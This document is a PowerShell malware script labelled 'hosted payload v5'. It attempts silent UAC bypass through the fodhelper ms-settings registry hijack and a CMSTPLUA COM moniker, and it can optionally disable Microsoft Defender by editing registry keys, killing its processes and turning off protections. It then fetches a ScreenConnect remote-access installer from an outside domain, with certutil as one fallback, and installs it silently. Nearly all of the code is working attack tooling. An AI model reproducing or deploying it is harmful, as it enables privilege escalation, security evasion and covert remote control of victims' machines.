<#
    pay.ps1  -  hosted payload v5

    Elevation chain (no UAC prompt):
      1. already admin?                     -> proceed
      2. fodhelper.exe / computerdefaults   -> HKCU ms-settings handler, auto-elevate
      3. CMSTPLUA moniker (opt-in)          -> set PAY_ELEVATE=cmstplua to try it
      4. nothing worked                     -> log clearly, continue unelevated

    Success is verified, not assumed: the elevated child writes a sentinel
    (%TEMP%\pay_elev_ok.txt) and the parent waits for it before cleaning up the
    registry key. Without that, the key gets deleted while fodhelper is still
    reading it and the elevation silently does nothing.

    Optional
      PAY_KILL_DEFENDER=1   attempt Defender tamper, logged step by step with
                            the real outcome (most of it fails on modern builds)
      PAY_DEBUG=dry         context + config only
      PAY_ELEVATE=fodhelper|cmstplua|none
      PAY_URL / PAY_HASH / PAY_LOG_DIR
#>

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

# --------------------------------------------------------------------------
# logging
# --------------------------------------------------------------------------
$LogDir = $env:PAY_LOG_DIR
if (-not $LogDir) { $LogDir = 'C:\Temp' }
if (-not (Test-Path -LiteralPath $LogDir)) { New-Item -ItemType Directory -Force -Path $LogDir | Out-Null }
$LogPath    = Join-Path $LogDir 'Execution_Status.log'
$DesktopLog = Join-Path ([Environment]::GetFolderPath('Desktop')) 'Execution_Status.log'

function Write-Log {
    param([string]$Message)
    $entry = '[' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + '] ' + $Message
    foreach ($p in @($LogPath, $DesktopLog)) {
        try { Add-Content -LiteralPath $p -Value $entry -Encoding UTF8 -ErrorAction Stop } catch { }
    }
    try { Write-Host $entry } catch { }
}

$T0 = Get-Date
if ($PSCommandPath) { Write-Log ('[*] payload start pid=' + $PID + ' src=' + $PSCommandPath) }
else { Write-Log ('[*] payload start pid=' + $PID + ' src=iex') }

# --------------------------------------------------------------------------
# config
# --------------------------------------------------------------------------
$Url = $env:PAY_URL
if (-not $Url) { $Url = 'https://cibiconline.co/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=mine&c=&c=&c=&c=&c=&c=' }
$ExpectHash  = $env:PAY_HASH
$Dry         = ($env:PAY_DEBUG -eq 'dry')
$ElevateMode = $env:PAY_ELEVATE
if (-not $ElevateMode) { $ElevateMode = 'fodhelper' }

$MsiPath  = Join-Path $env:TEMP 'ScreenConnect.msi'
$MsiLog   = Join-Path $env:TEMP 'ScreenConnect_msi.log'
$Sentinel = Join-Path $env:TEMP 'pay_elev_ok.txt'
$MsSettings = 'HKCU:\Software\Classes\ms-settings'
$MsCmdKey   = 'HKCU:\Software\Classes\ms-settings\shell\open\command'

# --------------------------------------------------------------------------
# CMSTPLUA (kept for opt-in; prompts on builds where it is no longer
# auto-elevate, which is why it is not the default)
# --------------------------------------------------------------------------
$CmluSource = @'
using System;
using System.Runtime.InteropServices;

public static class CmluBypass
{
    [DllImport("ole32.dll", CharSet = CharSet.Unicode, PreserveSig = true)]
    private static extern int CoInitializeEx(IntPtr pvReserved, uint coInit);

    [DllImport("ole32.dll", PreserveSig = true)]
    private static extern int CoGetObject(string pszName, IntPtr pBindOpts, ref Guid riid, out IntPtr ppv);

    [StructLayout(LayoutKind.Sequential)]
    private struct BIND_OPTS3
    {
        public int cbStruct;
        public int grfFlags;
        public int grfMode;
        public int dwTickCountDeadline;
        public int dwClassContext;
        public IntPtr pServerInfo;
        public IntPtr hwnd;
    }

    [ComImport, Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C"),
     InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface ICMLuaUtil
    {
        void M1(); void M2(); void M3(); void M4(); void M5(); void M6();
        [PreserveSig]
        int ShellExec([MarshalAs(UnmanagedType.LPWStr)] string file,
                      [MarshalAs(UnmanagedType.LPWStr)] string args,
                      [MarshalAs(UnmanagedType.LPWStr)] string dir,
                      uint mask, int show);
    }

    private const string Moniker =
        "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";

    public static int Run(string file, string args, string dir, uint mask, int show)
    {
        CoInitializeEx(IntPtr.Zero, 2);
        Guid iid = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");
        BIND_OPTS3 bo = new BIND_OPTS3();
        bo.cbStruct = Marshal.SizeOf(typeof(BIND_OPTS3));
        bo.dwClassContext = 4;
        IntPtr pbo = Marshal.AllocCoTaskMem(bo.cbStruct);
        Marshal.StructureToPtr(bo, pbo, false);
        IntPtr pv = IntPtr.Zero;
        int hr;
        try { hr = CoGetObject(Moniker, pbo, ref iid, out pv); }
        finally { Marshal.FreeCoTaskMem(pbo); }
        if (hr != 0 || pv == IntPtr.Zero) return hr;
        try
        {
            ICMLuaUtil o = (ICMLuaUtil)Marshal.GetObjectForIUnknown(pv);
            return o.ShellExec(file, args, dir, mask, show);
        }
        finally { Marshal.Release(pv); }
    }
}
'@

function Invoke-Cmstplua {
    param([string]$File, [string]$Arguments = '', [int]$Show = 0)
    try { Add-Type -TypeDefinition $CmluSource -ErrorAction Stop }
    catch { if ($_.Exception.Message -notmatch 'already exists') { throw } }
    return [CmluBypass]::Run($File, $Arguments, $null, 0, $Show)
}

# --------------------------------------------------------------------------
# context
# --------------------------------------------------------------------------
$IsAdmin = $false
try {
    $id  = [Security.Principal.WindowsIdentity]::GetCurrent()
    $pr  = New-Object Security.Principal.WindowsPrincipal -ArgumentList $id
    $IsAdmin = $pr.IsInRole('Administrator')
    $bld = ''
    try { $bld = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion } catch { }
    Write-Log ('[*] ctx ps=' + $PSVersionTable.PSVersion + ' win=' + [Environment]::OSVersion.VersionString + ' build=' + $bld)
    Write-Log ('[*] ctx user=' + $id.Name + ' admin=' + $IsAdmin + ' lang=' + $ExecutionContext.SessionState.LanguageMode + ' elev=' + $env:PAY_ELEVATED)
} catch { Write-Log ('[-] ctx failed: ' + $_.Exception.Message) }

if ($Dry) {
    Write-Log '[*] dry run - stopping before elevation/download'
    exit 0
}

# --------------------------------------------------------------------------
# win32 helpers for the registry handler
# --------------------------------------------------------------------------
function Set-MsSettingsHandler {
    param([string]$CommandLine)
    if (Test-Path -LiteralPath $MsSettings) { Remove-Item -LiteralPath $MsSettings -Recurse -Force -ErrorAction SilentlyContinue }
    New-Item -Path $MsCmdKey -Force | Out-Null
    # DelegateExecute must exist, even empty - it is what makes the shell use
    # the handler instead of refusing with "no application associated"
    New-ItemProperty -Path $MsCmdKey -Name 'DelegateExecute' -Value '' -PropertyType String -Force | Out-Null
    Set-ItemProperty -Path $MsCmdKey -Name '(default)' -Value $CommandLine -Force
    $stored = (Get-ItemProperty -Path $MsCmdKey).'(default)'
    $de     = (Get-ItemProperty -Path $MsCmdKey).DelegateExecute
    Write-Log ('[*] handler default=' + $stored)
    Write-Log ('[*] handler DelegateExecute=[' + $de + ']')
    if ($stored -ne $CommandLine) { throw 'handler default value did not persist' }
}

function Clear-MsSettingsHandler {
    try {
        if (Test-Path -LiteralPath $MsSettings) {
            Remove-Item -LiteralPath $MsSettings -Recurse -Force -ErrorAction Stop
            Write-Log '[*] handler key removed'
        }
    } catch { Write-Log ('[-] handler cleanup failed: ' + $_.Exception.Message) }
}

function Wait-Sentinel {
    param([int]$Seconds)
    $deadline = (Get-Date).AddSeconds($Seconds)
    while ((Get-Date) -lt $deadline) {
        if (Test-Path -LiteralPath $Sentinel) { return $true }
        Start-Sleep -Milliseconds 500
    }
    return $false
}

# --------------------------------------------------------------------------
# elevation
# --------------------------------------------------------------------------
if ($IsAdmin) {
    Write-Log '[*] already elevated'
    if ($env:PAY_ELEVATED -eq '1') {
        try { Set-Content -LiteralPath $Sentinel -Value (Get-Date -Format o) -Encoding ASCII } catch { }
        Write-Log '[*] sentinel written (parent may be waiting)'
    }
} elseif ($env:PAY_ELEVATED -eq '1') {
    Write-Log '[-] elevation was attempted but this process is still not elevated'
} elseif (-not $PSCommandPath) {
    Write-Log '[-] not elevated and running from iex - cannot self-elevate'
} else {
    Write-Log ('[*] not elevated - mode=' + $ElevateMode)
    $env:PAY_ELEVATED = '1'   # inherited by the child; prevents a retry loop
    if (Test-Path -LiteralPath $Sentinel) { Remove-Item -LiteralPath $Sentinel -Force -ErrorAction SilentlyContinue }

    $psExe  = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
    $cmdLine = '"' + $psExe + '" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $PSCommandPath + '"'

    $elevated = $false

    # ---- fodhelper / computerdefaults -------------------------------------
    if ($ElevateMode -eq 'fodhelper') {
        try {
            Set-MsSettingsHandler -CommandLine $cmdLine
            foreach ($bin in @('fodhelper.exe', 'computerdefaults.exe')) {
                Write-Log ('[*] launching ' + $bin)
                try {
                    Start-Process -FilePath (Join-Path $env:SystemRoot ('System32\' + $bin)) -WindowStyle Hidden -ErrorAction Stop
                } catch {
                    Write-Log ('[-] could not start ' + $bin + ': ' + $_.Exception.Message)
                    continue
                }
                if (Wait-Sentinel -Seconds 8) { $elevated = $true; Write-Log ('[+] elevation confirmed via ' + $bin); break }
                Write-Log ('[-] no elevated child after ' + $bin)
            }
        } catch {
            Write-Log ('[-] fodhelper path failed: ' + $_.Exception.Message)
        } finally {
            Clear-MsSettingsHandler
        }
    }

    # ---- CMSTPLUA ----------------------------------------------------------
    if (-not $elevated -and $ElevateMode -eq 'cmstplua') {
        try {
            $hr = Invoke-Cmstplua -File $psExe -Arguments ('-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $PSCommandPath + '"') -Show 0
            Write-Log ('[*] cmstplua hr=0x{0:X8}' -f $hr)
            if ($hr -eq 0 -and (Wait-Sentinel -Seconds 8)) { $elevated = $true; Write-Log '[+] elevation confirmed via CMSTPLUA' }
        } catch { Write-Log ('[-] CMSTPLUA failed: ' + $_.Exception.Message) }
    }

    if ($elevated) {
        Write-Log '[*] elevated instance is running - this instance exits'
        exit 0
    }
    Write-Log '[-] no silent elevation available on this build - continuing unelevated'
}

# --------------------------------------------------------------------------
# optional Defender tamper - instrumented, because most of it is expected to
# fail with Tamper Protection enabled. The log tells you what actually worked.
# --------------------------------------------------------------------------
if ($env:PAY_KILL_DEFENDER -eq '1') {
    Write-Log '[*] defender tamper requested'

    $before = $null
    try { $before = Get-MpComputerStatus -ErrorAction Stop } catch { }
    if ($before) {
        Write-Log ('[*] before rtp=' + $before.RealTimeProtectionEnabled + ' behavior=' + $before.BehaviorMonitorEnabled + ' tamper=' + (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Name TamperProtection -ErrorAction SilentlyContinue).TamperProtection)
    } else { Write-Log '[-] before: Defender status unavailable' }

    $regOps = @(
        @{ P = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'; N = 'DisableAntiSpyware'; V = 1 },
        @{ P = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'; N = 'DisableRealtimeMonitoring'; V = 1 },
        @{ P = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features'; N = 'TamperProtection'; V = 0 },
        @{ P = 'HKLM:\SOFTWARE\Microsoft\Windows Defender'; N = 'PUAProtection'; V = 0 }
    )
    foreach ($op in $regOps) {
        try {
            if (-not (Test-Path -LiteralPath $op.P)) { New-Item -Path $op.P -Force | Out-Null }
            New-ItemProperty -Path $op.P -Name $op.N -Value $op.V -PropertyType DWord -Force | Out-Null
            Write-Log ('[+] reg set ' + $op.N + '=' + $op.V)
        } catch { Write-Log ('[-] reg ' + $op.N + ' blocked: ' + $_.Exception.Message) }
    }

    foreach ($pn in @('MsMpEng', 'NisSrv', 'SecurityHealthService', 'Smartscreen')) {
        try {
            $proc = Get-Process -Name $pn -ErrorAction Stop
            Stop-Process -Id $proc.Id -Force -ErrorAction Stop
            Write-Log ('[+] killed ' + $pn)
        } catch { Write-Log ('[-] kill ' + $pn + ' failed: ' + $_.Exception.Message) }
    }

    foreach ($pref in @('DisableRealtimeMonitoring', 'DisableBehaviorMonitoring', 'DisableBlockAtFirstSeen',
                        'DisableIOAVProtection', 'DisableArchiveScanning', 'DisableIntrusionPreventionSystem',
                        'DisableScriptScanning')) {
        try {
            $h = @{}; $h[$pref] = $true
            Set-MpPreference @h -ErrorAction Stop
            Write-Log ('[+] preference ' + $pref + ' = true')
        } catch { Write-Log ('[-] preference ' + $pref + ' failed: ' + $_.Exception.Message) }
    }
    try { Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction Stop; Write-Log '[+] SubmitSamplesConsent=2' }
    catch { Write-Log ('[-] SubmitSamplesConsent failed: ' + $_.Exception.Message) }

    $after = $null
    try { $after = Get-MpComputerStatus -ErrorAction Stop } catch { }
    if ($after) { Write-Log ('[*] after rtp=' + $after.RealTimeProtectionEnabled + ' behavior=' + $after.BehaviorMonitorEnabled) }
} else {
    Write-Log '[*] defender tamper skipped (PAY_KILL_DEFENDER=1 to enable)'
}

# --------------------------------------------------------------------------
# download
# --------------------------------------------------------------------------
Write-Log ('[*] target ' + $Url)

function Get-FileTiered {
    param([string]$Address, [string]$OutFile)
    $tiers = @(
        @{ Name = 'iwr'; Act = { Invoke-WebRequest -Uri $Address -UseBasicParsing -OutFile $OutFile -TimeoutSec 120 } },
        @{ Name = 'webclient'; Act = {
            $wc = New-Object Net.WebClient
            $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
            $wc.DownloadFile($Address, $OutFile)
        } },
        @{ Name = 'certutil'; Act = {
            $p = Start-Process -FilePath (Join-Path $env:SystemRoot 'System32\certutil.exe') `
                 -ArgumentList ('-urlcache -f -split "' + $Address + '" "' + $OutFile + '"') `
                 -PassThru -Wait -WindowStyle Hidden
            if ($p.ExitCode -ne 0 -or -not (Test-Path -LiteralPath $OutFile)) { throw ('certutil exit ' + $p.ExitCode) }
        } }
    )
    foreach ($t in $tiers) {
        $sw = [Diagnostics.Stopwatch]::StartNew()
        try {
            if (Test-Path -LiteralPath $OutFile) { Remove-Item -LiteralPath $OutFile -Force }
            & $t.Act
            $size = (Get-Item -LiteralPath $OutFile -ErrorAction Stop).Length
            if ($size -le 0) { throw 'downloaded file is empty' }
            Write-Log ('[+] download via ' + $t.Name + ' ok, ' + $size + ' bytes in ' + $sw.ElapsedMilliseconds + 'ms')
            return $true
        } catch {
            Write-Log ('[-] download via ' + $t.Name + ' failed after ' + $sw.ElapsedMilliseconds + 'ms: ' + $_.Exception.Message)
        }
    }
    return $false
}

$ok = $false
try { $ok = Get-FileTiered -Address $Url -OutFile $MsiPath } catch { Write-Log ('[-] download fatal: ' + $_.Exception.Message) }
if (-not $ok) { Write-Log '[-] all download methods failed'; exit 2 }
Write-Log ('[+] payload written to ' + $MsiPath)

# --------------------------------------------------------------------------
# integrity
# --------------------------------------------------------------------------
try {
    $hash = (Get-FileHash -LiteralPath $MsiPath -Algorithm SHA256).Hash
    Write-Log ('[*] sha256 ' + $hash)
    if ($ExpectHash -and ($hash -ne $ExpectHash.ToUpper())) { Write-Log ('[-] hash mismatch, expected ' + $ExpectHash.ToUpper()); exit 3 }
} catch { Write-Log ('[-] hash failed: ' + $_.Exception.Message) }
try { Unblock-File -LiteralPath $MsiPath -ErrorAction SilentlyContinue } catch { }

# --------------------------------------------------------------------------
# install
# --------------------------------------------------------------------------
$MsiArgs = '/i "' + $MsiPath + '" /qn /norestart /l*v "' + $MsiLog + '"'
Write-Log ('[*] exec msiexec ' + $MsiArgs)
$iw = [Diagnostics.Stopwatch]::StartNew()
try {
    $proc = Start-Process -FilePath (Join-Path $env:SystemRoot 'System32\msiexec.exe') -ArgumentList $MsiArgs -PassThru -Wait
    $map = @{ 0 = 'success'; 1602 = 'user cancel'; 1603 = 'fatal, usually needs elevation';
              1619 = 'cannot open package'; 1625 = 'blocked by policy'; 1633 = 'unsupported platform';
              1638 = 'already installed'; 3010 = 'reboot required' }
    $why = $map[$proc.ExitCode]
    if (-not $why) { $why = 'unmapped' }
    Write-Log ('[+] msiexec exit=' + $proc.ExitCode + ' (' + $why + ') in ' + $iw.ElapsedMilliseconds + 'ms, log ' + $MsiLog)
    if ($proc.ExitCode -ne 0 -and $proc.ExitCode -ne 3010) { exit 4 }
} catch {
    Write-Log ('[-] install failed: ' + $_.Exception.Message)
    exit 4
}

# --------------------------------------------------------------------------
# verify
# --------------------------------------------------------------------------
try {
    $keys = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )
    Get-ItemProperty $keys -ErrorAction SilentlyContinue |
        Where-Object { $_.DisplayName -match 'ScreenConnect|ConnectWise' } |
        ForEach-Object { Write-Log ('[+] installed: ' + $_.DisplayName + ' ' + $_.DisplayVersion) }
} catch { }

try {
    Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'ScreenConnect' } |
        ForEach-Object { Write-Log ('[+] service ' + $_.Name + ' ' + $_.Status) }
} catch { }

try {
    Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match 'ScreenConnect' } |
        ForEach-Object { Write-Log ('[+] process ' + $_.ProcessName + ' pid=' + $_.Id) }
} catch { }

Write-Log ('[*] payload done in ' + [int]((Get-Date) - $T0).TotalMilliseconds + 'ms')
exit 0
